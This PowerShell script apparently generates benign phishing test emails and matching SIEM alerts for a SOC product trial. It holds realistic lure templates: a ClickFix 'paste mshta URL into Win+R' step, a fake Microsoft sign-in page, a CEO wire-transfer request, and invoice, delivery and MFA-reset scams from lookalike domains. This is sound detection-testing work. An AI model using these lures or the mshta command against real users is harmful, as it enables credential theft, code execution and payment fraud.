# ============================================================
# Generate-PhishingArtifacts.ps1
# ECI SOC Team — Qevlar POC (Defensive Testing Only)
# Generates benign phishing EML files and Elastic/Qevlar JSON alerts
# ============================================================

[CmdletBinding()]
param(
    [string]$OutputDir     = ".\phishing_artifacts",
    [string]$TestBaseUrl   = "http://phishtest.internal",
    [string]$TargetDomain  = "eci.com",
    [int]   $CountPerType  = 3
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

# ─────────────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────────────

function New-Dirs {
    $subdirs = @(
        "emails\clickfix","emails\credential_harvest","emails\quishing",
        "emails\html_attachment","emails\bec","emails\invoice",
        "emails\delivery","emails\mfa_reset",
        "html_attachments","siem_alerts\elastic","siem_alerts\sentinel",
        "qevlar_payloads","reports"
    )
    foreach ($d in $subdirs) {
        $path = Join-Path $OutputDir $d
        if (-not (Test-Path $path)) { New-Item -ItemType Directory -Path $path | Out-Null }
    }
}

function Get-RandomElement([array]$arr) { $arr | Get-Random }

function Get-FakeIP {
    "{0}.{1}.{2}.{3}" -f (Get-Random -Min 1 -Max 254),(Get-Random -Min 1 -Max 254),
                          (Get-Random -Min 1 -Max 254),(Get-Random -Min 1 -Max 254)
}

function Get-RandomDate {
    $daysBack = Get-Random -Min 0 -Max 30
    (Get-Date).ToUniversalTime().AddDays(-$daysBack).AddHours(-(Get-Random -Min 0 -Max 23)).AddMinutes(-(Get-Random -Min 0 -Max 59))
}

function Get-ShortGuid { [guid]::NewGuid().ToString("N").Substring(0,8) }
function Get-FullGuid  { [guid]::NewGuid().ToString() }

$SenderDomains = @(
    "microsoft-security.com","docusign-alerts.net","office365-verify.org",
    "fedex-track.info","payroll-secure.net","support-helpdesk.com",
    "invoice-portal.net","mfa-verify.org","shipping-notify.com"
)

# ─────────────────────────────────────────────────────────────
# EML BUILDER
# ─────────────────────────────────────────────────────────────

function New-EmlContent {
    param(
        [string]$FromName,
        [string]$FromEmail,
        [string]$ToEmail,
        [string]$Subject,
        [datetime]$Date,
        [string]$HtmlBody,
        [string]$PlainBody = "",
        [hashtable[]]$Attachments = @()
    )

    $msgId    = "<{0}@{1}>" -f [guid]::NewGuid().ToString("N").Substring(0,16), $FromEmail.Split("@")[1]
    $dateStr  = $Date.ToUniversalTime().ToString("ddd, dd MMM yyyy HH:mm:ss +0000")
    $boundary = "----=_Part_$(Get-Random -Min 100000 -Max 999999)"
    $mailers  = @("Microsoft Outlook 16.0","Apple Mail 16.0","Thunderbird 115.0")

    $eml = @"
From: $FromName <$FromEmail>
To: $ToEmail
Subject: $Subject
Date: $dateStr
Message-ID: $msgId
MIME-Version: 1.0
X-Mailer: $(Get-RandomElement $mailers)
X-Originating-IP: $(Get-FakeIP)
X-Simulation-Type: PHISHING-POC-BENIGN-ECI
X-SOC-Test-ID: QEVLAR-POC-$(Get-ShortGuid)
Content-Type: multipart/mixed; boundary="$boundary"

--$boundary
Content-Type: multipart/alternative; boundary="alt_$boundary"

--alt_$boundary
Content-Type: text/plain; charset=UTF-8

$PlainBody
[SOC SIMULATION — ECI QEVLAR POC — NOT MALICIOUS]
--alt_$boundary
Content-Type: text/html; charset=UTF-8

$HtmlBody
--alt_$boundary--
"@

    foreach ($att in $Attachments) {
        $b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($att.Content))
        $eml += @"

--$boundary
Content-Type: $($att.MimeType); name="$($att.Filename)"
Content-Disposition: attachment; filename="$($att.Filename)"
Content-Transfer-Encoding: base64

$b64
"@
    }

    $eml += "`n--$boundary--"
    return $eml
}

# ─────────────────────────────────────────────────────────────
# HTML ATTACHMENT TEMPLATES
# ─────────────────────────────────────────────────────────────

function Get-HtmlCredentialPage {
    return @"
<!DOCTYPE html><html><head><title>Microsoft Sign-In</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:'Segoe UI',Arial;background:#f3f2f1;display:flex;align-items:center;justify-content:center;min-height:100vh}.card{background:#fff;padding:44px;max-width:440px;width:100%;box-shadow:0 2px 6px rgba(0,0,0,.12)}.logo{font-size:22px;color:#0078d4;font-weight:300;margin-bottom:28px}h1{font-size:18px;font-weight:600;color:#323130;margin-bottom:4px}p{font-size:13px;color:#605e5c;margin-bottom:20px}input{width:100%;padding:6px 8px;border:1px solid #8a8886;font-size:15px;margin-bottom:12px}.btn{width:100%;padding:8px;background:#0078d4;color:#fff;border:none;font-size:15px;cursor:pointer}.sim{margin-top:20px;padding:8px;background:#fff4ce;border:1px solid #f0c040;font-size:11px;color:#7a6000;text-align:center}</style></head>
<body><div class="card"><div class="logo">Microsoft</div><h1>Sign in</h1><p>Use your Microsoft account</p>
<input type="email" placeholder="Email, phone, or Skype">
<input type="password" placeholder="Password">
<button class="btn" onclick="window.location.href='$TestBaseUrl?t=cred&a=submit'">Next</button>
<div class="sim">SOC SIMULATION — No credentials are captured.</div></div></body></html>
"@
}

# ─────────────────────────────────────────────────────────────
# EMAIL GENERATORS
# ─────────────────────────────────────────────────────────────

function New-ClickFixEmail {
    $date     = Get-RandomDate
    $domain   = Get-RandomElement $SenderDomains
    $sender   = "helpdesk@$domain"
    $url      = "$TestBaseUrl/clickfix?id=POC$(Get-Random -Min 1000 -Max 9999)"
    $subject  = "ACTION REQUIRED: Browser Verification to Access Company Portal"
    $html = @"
<html><body><div style="font-family:Calibri,Arial;font-size:14px;max-width:600px;margin:0 auto;">
<table width="100%"><tr><td style="background:#0078d4;padding:14px 20px;"><span style="color:#fff;font-size:16px;font-weight:600;">IT Support Portal</span></td></tr>
<tr><td style="padding:24px;">
<p>Your browser session requires verification to continue accessing company resources.</p>
<div style="background:#fff8e1;border-left:4px solid #ffc107;padding:12px 16px;margin:16px 0;">
<strong>Security Verification Required</strong><br>Automated bots detected from your network segment.</div>
<p>Press <strong>Windows + R</strong>, paste the command below, press <strong>Enter</strong>:</p>
<div style="background:#1e1e1e;color:#4ec9b0;font-family:monospace;padding:14px;border-radius:4px;">mshta $url</div>
<p style="font-size:11px;color:#aaa;margin-top:20px;">[SOC SIMULATION — CLICKFIX — ECI QEVLAR POC]</p>
</td></tr></table></div></body></html>
"@
    $eml = New-EmlContent -FromName "IT Help Desk" -FromEmail $sender -ToEmail "user@$TargetDomain" `
        -Subject $subject -Date $date -HtmlBody $html `
        -PlainBody "IT Support: Browser verification required. Run provided command. [SOC SIMULATION]"

    $fname = "clickfix_$(Get-ShortGuid).eml"
    $fpath = Join-Path $OutputDir "emails\clickfix\$fname"
    $eml | Out-File -FilePath $fpath -Encoding utf8

    return @{type="clickfix"; file=$fpath; subject=$subject; sender="IT Help Desk <$sender>";
             date=$date.ToString("o"); ioc=@{url=$url; sender_domain=$domain}}
}

function New-CredentialHarvestEmail {
    $date     = Get-RandomDate
    $domain   = Get-RandomElement $SenderDomains
    $sender   = "security@$domain"
    $srcIP    = Get-FakeIP
    $country  = Get-RandomElement @("Russia","China","Nigeria","North Korea","Vietnam")
    $url      = "$TestBaseUrl/auth?type=cred&tid=POC$(Get-Random -Min 1000 -Max 9999)"
    $subject  = "Microsoft account: Unusual sign-in activity detected"
    $html = @"
<html><body><div style="font-family:'Segoe UI',Arial;max-width:600px;margin:0 auto;">
<div style="background:#0078d4;padding:16px 24px;"><span style="color:#fff;font-size:20px;font-weight:300;">Microsoft</span></div>
<div style="padding:24px;"><h2 style="font-size:17px;color:#323130;">Unusual sign-in activity</h2>
<p>We detected a sign-in from a new location. If this was you, you can ignore this email.</p>
<table style="border:1px solid #edebe9;width:100%;border-collapse:collapse;margin:16px 0;">
<tr style="background:#f3f2f1;"><th style="padding:8px 12px;text-align:left;font-size:12px;">DETAIL</th><th style="padding:8px 12px;text-align:left;font-size:12px;">VALUE</th></tr>
<tr><td style="padding:8px 12px;">Country/Region</td><td style="padding:8px 12px;"><strong>$country</strong></td></tr>
<tr style="background:#f3f2f1;"><td style="padding:8px 12px;">IP Address</td><td style="padding:8px 12px;">$srcIP</td></tr>
<tr><td style="padding:8px 12px;">Date</td><td style="padding:8px 12px;">$($date.ToString('MMMM dd, yyyy HH:mm UTC'))</td></tr>
</table>
<a href="$url" style="display:inline-block;background:#0078d4;color:#fff;padding:10px 24px;text-decoration:none;border-radius:2px;font-size:14px;">Review Recent Activity</a>
<p style="font-size:10px;color:#aaa;margin-top:20px;">[SOC SIMULATION — CREDENTIAL HARVEST — ECI QEVLAR POC]</p></div></div></body></html>
"@
    $attachContent = Get-HtmlCredentialPage
    $attachments = @(@{Filename="SecureDocument.html"; MimeType="text/html"; Content=$attachContent})

    $eml = New-EmlContent -FromName "Microsoft Account Team" -FromEmail $sender -ToEmail "user@$TargetDomain" `
        -Subject $subject -Date $date -HtmlBody $html `
        -PlainBody "Microsoft: Unusual sign-in detected from $country ($srcIP). [SOC SIMULATION]" `
        -Attachments $attachments

    $fname = "credential_harvest_$(Get-ShortGuid).eml"
    $fpath = Join-Path $OutputDir "emails\credential_harvest\$fname"
    $eml | Out-File -FilePath $fpath -Encoding utf8

    return @{type="credential_harvest"; file=$fpath; subject=$subject; sender="Microsoft Account Team <$sender>";
             date=$date.ToString("o"); ioc=@{url=$url; src_ip=$srcIP; country=$country; attachment="SecureDocument.html"}}
}

function New-BECEmail {
    $date     = Get-RandomDate
    $domain   = Get-RandomElement $SenderDomains
    $execs    = @(
        @{name="James Wilson";title="CEO"},@{name="Sarah Chen";title="CFO"},
        @{name="Michael Roberts";title="COO"},@{name="David Kumar";title="Managing Director"}
    )
    $exec     = Get-RandomElement $execs
    $exName   = $exec.name
    $exTitle  = $exec.title
    $emailPrefix = ($exName -replace " ","." ).ToLower() + "$(Get-Random -Min 10 -Max 99)"
    $sender   = "$emailPrefix@$domain"
    $amount   = Get-Random -Min 25000 -Max 200000
    $bank     = Get-RandomElement @("First National Bank","Citibank N.A.","HSBC Holdings","JPMorgan Chase")
    $acct     = "****$(Get-Random -Min 1000 -Max 9999)"
    $ref      = "VENDOR-$(Get-Random -Min 1000 -Max 9999)"
    $subject  = "Urgent: Wire Transfer — Confidential"
    $html = @"
<html><body><div style="font-family:Calibri,Arial;font-size:14px;max-width:600px;">
<p>Hi,</p><p>I need a wire transfer processed today. Time-sensitive — please handle before EOD. Do not discuss with anyone else until completed.</p>
<table style="border:1px solid #e2e8f0;border-radius:4px;padding:12px;margin:16px 0;border-collapse:collapse;">
<tr style="background:#f7fafc;"><td style="padding:8px 12px;"><strong>Amount</strong></td><td style="padding:8px 12px;font-size:16px;font-weight:700;color:#e53e3e;">`$$("{0:N0}" -f $amount)</td></tr>
<tr><td style="padding:8px 12px;"><strong>Bank</strong></td><td style="padding:8px 12px;">$bank</td></tr>
<tr style="background:#f7fafc;"><td style="padding:8px 12px;"><strong>Account</strong></td><td style="padding:8px 12px;">$acct</td></tr>
<tr><td style="padding:8px 12px;"><strong>Reference</strong></td><td style="padding:8px 12px;">$ref</td></tr></table>
<p>I'm in back-to-back meetings but will check messages. Confirm once initiated.</p>
<p><strong>$exName</strong><br>$exTitle, ECI</p>
<p style="font-size:10px;color:#aaa;">[SOC SIMULATION — BEC — ECI QEVLAR POC]</p>
</div></body></html>
"@
    $eml = New-EmlContent -FromName "$exName — $exTitle" -FromEmail $sender -ToEmail "finance@$TargetDomain" `
        -Subject $subject -Date $date -HtmlBody $html `
        -PlainBody "Urgent wire transfer required. Amount: `$$("{0:N0}" -f $amount). Bank: $bank. Ref: $ref. [SOC SIMULATION]"

    $fname = "bec_$(Get-ShortGuid).eml"
    $fpath = Join-Path $OutputDir "emails\bec\$fname"
    $eml | Out-File -FilePath $fpath -Encoding utf8

    return @{type="bec"; file=$fpath; subject=$subject; exec_impersonated="$exName ($exTitle)";
             sender="$exName — $exTitle <$sender>"; date=$date.ToString("o");
             ioc=@{amount="`$$("{0:N0}" -f $amount)"; bank=$bank; sender_domain=$domain}}
}

function New-InvoiceEmail {
    $date     = Get-RandomDate
    $domain   = Get-RandomElement $SenderDomains
    $vendor   = Get-RandomElement @("CloudTech Solutions","DataStream Inc","SecureNet Services","TechVault Corp")
    $sender   = "billing@$domain"
    $invNum   = "INV-$(Get-Random -Min 10000 -Max 99999)"
    $amount   = Get-Random -Min 800 -Max 18000
    $due      = ($date.AddDays(2)).ToString("MMMM dd, yyyy")
    $payUrl   = "$TestBaseUrl/invoice?inv=$invNum&t=POC"
    $subject  = "OVERDUE: Invoice $invNum — `$$("{0:N0}" -f $amount) Due $due"
    $html = @"
<html><body><div style="font-family:Arial;max-width:600px;margin:0 auto;">
<div style="background:#1a202c;padding:18px 24px;"><span style="color:#fff;font-size:18px;font-weight:700;">$vendor</span></div>
<div style="padding:24px;background:#f7fafc;">
<div style="background:#fff3cd;border:1px solid #ffc107;padding:12px 16px;border-radius:4px;margin-bottom:16px;"><strong>Payment Overdue — Action Required</strong></div>
<table style="width:100%;border-collapse:collapse;margin-bottom:20px;">
<tr style="background:#fff;"><td style="padding:10px 0;border-bottom:1px solid #e2e8f0;"><strong>Invoice #</strong></td><td style="padding:10px 0;border-bottom:1px solid #e2e8f0;">$invNum</td></tr>
<tr><td style="padding:10px 0;border-bottom:1px solid #e2e8f0;"><strong>Amount Due</strong></td><td style="padding:10px 0;font-size:20px;font-weight:700;color:#e53e3e;">`$$("{0:N0}" -f $amount).00</td></tr>
<tr style="background:#fff;"><td style="padding:10px 0;"><strong>Due Date</strong></td><td style="padding:10px 0;color:#e53e3e;">$due (OVERDUE)</td></tr></table>
<a href="$payUrl" style="background:#e53e3e;color:#fff;padding:12px 28px;text-decoration:none;border-radius:4px;display:inline-block;font-weight:700;">Pay Now — Avoid Penalty</a>
<p style="font-size:10px;color:#aaa;margin-top:20px;">[SOC SIMULATION — INVOICE PHISHING — ECI QEVLAR POC]</p>
</div></div></body></html>
"@
    $eml = New-EmlContent -FromName "$vendor Billing" -FromEmail $sender -ToEmail "accounts@$TargetDomain" `
        -Subject $subject -Date $date -HtmlBody $html

    $fname = "invoice_$(Get-ShortGuid).eml"
    $fpath = Join-Path $OutputDir "emails\invoice\$fname"
    $eml | Out-File -FilePath $fpath -Encoding utf8

    return @{type="invoice"; file=$fpath; subject=$subject; vendor=$vendor; invoice=$invNum;
             sender="$vendor Billing <$sender>"; date=$date.ToString("o");
             ioc=@{url=$payUrl; amount="`$$("{0:N0}" -f $amount)"; invoice_number=$invNum}}
}

function New-DeliveryEmail {
    $date     = Get-RandomDate
    $domain   = Get-RandomElement $SenderDomains
    $carrier  = Get-RandomElement @("FedEx","DHL","UPS","India Post")
    $sender   = "tracking@$domain"
    $tracking = -join ((1..12) | ForEach-Object { Get-Random -Min 0 -Max 9 })
    $fee      = Get-Random -Min 250 -Max 2500
    $payUrl   = "$TestBaseUrl/delivery?track=$tracking&t=POC"
    $subject  = "${carrier}: Package Held — Customs Fee Required — #$tracking"
    $html = @"
<html><body><div style="font-family:Arial;max-width:600px;margin:0 auto;">
<div style="background:#4d148c;padding:16px 24px;"><span style="color:#fff;font-size:20px;font-weight:700;">$carrier</span></div>
<div style="padding:24px;">
<h2 style="font-size:16px;color:#333;">Delivery Attempt Failed — Action Required</h2>
<p>Your package requires customs clearance before delivery.</p>
<div style="border:1px solid #e2e8f0;padding:16px;border-radius:4px;margin:16px 0;">
<p><strong>Tracking:</strong> $tracking</p>
<p><strong>Status:</strong> <span style="color:orange;font-weight:600;">HELD — Awaiting Payment</span></p>
<p><strong>Customs Fee:</strong> <strong style="color:#e53e3e;font-size:18px;">₹$("{0:N0}" -f $fee)</strong></p></div>
<a href="$payUrl" style="background:#ff6600;color:#fff;padding:10px 24px;text-decoration:none;border-radius:4px;display:inline-block;">Pay Fee &amp; Reschedule Delivery</a>
<p style="font-size:10px;color:#aaa;margin-top:20px;">[SOC SIMULATION — DELIVERY PHISHING — ECI QEVLAR POC]</p>
</div></div></body></html>
"@
    $eml = New-EmlContent -FromName "$carrier Delivery" -FromEmail $sender -ToEmail "user@$TargetDomain" `
        -Subject $subject -Date $date -HtmlBody $html

    $fname = "delivery_$(Get-ShortGuid).eml"
    $fpath = Join-Path $OutputDir "emails\delivery\$fname"
    $eml | Out-File -FilePath $fpath -Encoding utf8

    return @{type="delivery"; file=$fpath; subject=$subject; carrier=$carrier; tracking=$tracking;
             sender="$carrier Delivery <$sender>"; date=$date.ToString("o");
             ioc=@{url=$payUrl; tracking=$tracking; fee="₹$("{0:N0}" -f $fee)"}}
}

function New-MfaResetEmail {
    $date     = Get-RandomDate
    $domain   = Get-RandomElement $SenderDomains
    $sender   = "security-noreply@$domain"
    $token    = ([guid]::NewGuid().ToString("N") + [guid]::NewGuid().ToString("N")).Substring(0,24).ToUpper()
    $verUrl   = "$TestBaseUrl/mfa-reset?token=$token&t=POC"
    $subject  = "[ACTION REQUIRED] Your MFA Settings Were Changed — Verify Now"
    $html = @"
<html><body><div style="font-family:'Segoe UI',Arial;max-width:600px;margin:0 auto;">
<div style="background:#0078d4;padding:16px 24px;"><span style="color:#fff;font-size:18px;">IT Security</span></div>
<div style="padding:24px;">
<div style="background:#fde8e8;border:1px solid #f56565;padding:14px 16px;border-radius:4px;margin-bottom:16px;">
<strong style="color:#c53030;">Security Alert</strong><br>Your MFA settings were modified on $($date.ToString('MMMM dd, yyyy HH:mm UTC')).</div>
<p>If this was not you, your account may be compromised. Verify your identity immediately.</p>
<a href="$verUrl" style="background:#e53e3e;color:#fff;padding:12px 28px;text-decoration:none;border-radius:4px;display:inline-block;font-weight:700;">Secure My Account Now</a>
<p style="color:#718096;font-size:13px;margin-top:16px;">This link expires in <strong>15 minutes</strong>.<br>Reference: $($token.Substring(0,12))...</p>
<p style="font-size:10px;color:#aaa;margin-top:20px;">[SOC SIMULATION — MFA RESET PHISHING — ECI QEVLAR POC]</p>
</div></div></body></html>
"@
    $eml = New-EmlContent -FromName "IT Security — Account Alert" -FromEmail $sender -ToEmail "user@$TargetDomain" `
        -Subject $subject -Date $date -HtmlBody $html

    $fname = "mfa_reset_$(Get-ShortGuid).eml"
    $fpath = Join-Path $OutputDir "emails\mfa_reset\$fname"
    $eml | Out-File -FilePath $fpath -Encoding utf8

    return @{type="mfa_reset"; file=$fpath; subject=$subject; token=$token;
             sender="IT Security — Account Alert <$sender>"; date=$date.ToString("o");
             ioc=@{url=$verUrl; token_prefix=$token.Substring(0,12)}}
}

# ─────────────────────────────────────────────────────────────
# SIEM / QEVLAR ALERT GENERATOR
# ─────────────────────────────────────────────────────────────

$AlertMeta = @{
    "clickfix"           = @{rule="Suspicious ClickFix Lure Detected"; severity="high"; mitre="T1566.001"}
    "credential_harvest" = @{rule="Phishing Link — Credential Harvesting"; severity="high"; mitre="T1566.002"}
    "quishing"           = @{rule="QR Code Phishing (Quishing) Detected"; severity="medium"; mitre="T1566.001"}
    "html_attachment"    = @{rule="Malicious HTML Attachment Phishing"; severity="high"; mitre="T1566.001"}
    "bec"                = @{rule="Business Email Compromise Pattern Detected"; severity="critical"; mitre="T1566.002"}
    "invoice"            = @{rule="Invoice/Payment Phishing Email"; severity="medium"; mitre="T1566.001"}
    "delivery"           = @{rule="Delivery Notification Phishing"; severity="low"; mitre="T1566.001"}
    "mfa_reset"          = @{rule="MFA Reset Phishing — Urgency Lure"; severity="high"; mitre="T1566.002"}
}

function New-ElasticAlert($artifact) {
    $meta = $AlertMeta[$artifact.type]
    return @{
        "@timestamp"                       = (Get-Date).ToUniversalTime().ToString("o")
        "kibana.alert.uuid"                = [guid]::NewGuid().ToString()
        "kibana.alert.rule.name"           = $meta.rule
        "kibana.alert.severity"            = $meta.severity
        "kibana.alert.status"              = "active"
        "kibana.alert.workflow_status"     = "open"
        "event"                            = @{kind="signal"; category="email"; type=@("indicator")}
        "threat"                           = @(@{
            framework = "MITRE ATT&CK"
            tactic    = @{id="TA0001"; name="Initial Access"}
            technique = @(@{id=$meta.mitre; name="Phishing"})
        })
        "email"                            = @{
            from    = @{address = $artifact.sender}
            subject = $artifact.subject
        }
        "url"                              = @{full = $artifact.ioc.url}
        "labels"                           = @{simulation="true"; poc="qevlar"; phishing_type=$artifact.type}
        "tags"                             = @("phishing","poc-simulation","qevlar",$artifact.type)
    }
}

function New-QevlarPayload($artifact, $elastic) {
    return @{
        alert_id         = $elastic["kibana.alert.uuid"]
        source_siem      = "elastic"
        timestamp        = $elastic["@timestamp"]
        severity         = $elastic["kibana.alert.severity"]
        title            = $elastic["kibana.alert.rule.name"]
        simulation       = $true
        phishing_category = $artifact.type
        email_metadata   = @{sender=$artifact.sender; subject=$artifact.subject; eml_file=$artifact.file}
        iocs             = $artifact.ioc
        mitre_mapping    = @{tactic="Initial Access (TA0001)"; technique=$AlertMeta[$artifact.type].mitre}
        enrichment_context = @{
            sender_domain_age_days = (Get-Random -Min 1 -Max 30)
            url_reputation         = "phishing-simulation"
            spf_pass               = $false
            dkim_pass              = $false
            dmarc_pass             = $false
        }
        recommended_actions = @(
            "Quarantine email",
            "Block sender domain",
            "Search mailboxes for similar subjects (last 30 days)",
            "Notify recipient"
        )
    }
}

# ─────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────

Write-Host "[+] Phishing Artifact Generator — ECI Qevlar POC" -ForegroundColor Cyan
Write-Host "[+] Output   : $OutputDir" -ForegroundColor Gray
Write-Host "[+] Test URL : $TestBaseUrl" -ForegroundColor Gray
Write-Host "[+] Samples  : $CountPerType per category`n" -ForegroundColor Gray

New-Dirs

$generators = @(
    { New-ClickFixEmail },
    { New-CredentialHarvestEmail },
    { New-BECEmail },
    { New-InvoiceEmail },
    { New-DeliveryEmail },
    { New-MfaResetEmail }
)

$allArtifacts = @()

foreach ($gen in $generators) {
    for ($i = 0; $i -lt $CountPerType; $i++) {
        try {
            $artifact = & $gen
            $elastic  = New-ElasticAlert $artifact
            $qevlar   = New-QevlarPayload $artifact $elastic

            $base = "$($artifact.type)_$(Get-ShortGuid)"
            $elastic | ConvertTo-Json -Depth 10 | Out-File (Join-Path $OutputDir "siem_alerts\elastic\$base.json") -Encoding utf8
            $qevlar  | ConvertTo-Json -Depth 10 | Out-File (Join-Path $OutputDir "qevlar_payloads\$base.json") -Encoding utf8

            $allArtifacts += $artifact
            Write-Host "  [+] $($artifact.type.PadRight(30)) $(Split-Path $artifact.file -Leaf)" -ForegroundColor Green
        } catch {
            Write-Host "  [!] Error: $_" -ForegroundColor Red
        }
    }
}

$manifest = @{
    generated_at   = (Get-Date).ToUniversalTime().ToString("o")
    total_artifacts = $allArtifacts.Count
    categories     = $allArtifacts | Select-Object -ExpandProperty type -Unique
    config         = @{output_dir=$OutputDir; test_base_url=$TestBaseUrl; target_domain=$TargetDomain}
    artifacts      = $allArtifacts
}
$manifest | ConvertTo-Json -Depth 10 | Out-File (Join-Path $OutputDir "reports\manifest.json") -Encoding utf8

Write-Host "`n[+] Done. $($allArtifacts.Count) artifacts generated." -ForegroundColor Cyan
Write-Host "    EML files      : $OutputDir\emails\" -ForegroundColor Gray
Write-Host "    Elastic alerts : $OutputDir\siem_alerts\elastic\" -ForegroundColor Gray
Write-Host "    Qevlar payloads: $OutputDir\qevlar_payloads\" -ForegroundColor Gray
Write-Host "    Manifest       : $OutputDir\reports\manifest.json" -ForegroundColor Gray
Write-Host "`n[!] All artifacts are benign. For ECI SOC / Qevlar POC use only.`n" -ForegroundColor Yellow
